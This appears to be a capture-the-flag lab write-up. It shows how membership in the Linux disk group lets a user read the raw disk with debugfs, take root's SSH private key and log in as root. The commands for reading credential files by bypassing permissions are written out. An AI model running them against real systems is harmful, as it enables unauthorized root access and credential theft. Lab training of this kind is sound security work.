Running `linpeas.sh` reveals that user `yossi` is part of disk group
![[Pasted image 20240904172838.png]]

Privilege escalation is possible via exploiting disk misconfigurations in the system. This disk group allows full access to a user to any blocked devices within /dev/ and since /dev/sda1/ is a general global file-system. This group has full read-write privileges to this device

```bash
ls -la /dev/
```
![[Pasted image 20240904173034.png]]

- Display all available partitions
```bash
df -h
```
![[Pasted image 20240904173128.png]]

`debugfs` can be used to enumerate entire disk with root privileges
```bash
debugfs /dev/sda1
```

Now we can just explore the filesystem using regular Linux commands
![[Pasted image 20240904173510.png]]

- Grabbed SSH private key and logged into the system as user root
```bash
ssh root@10.10.10.73 -i root.key
```
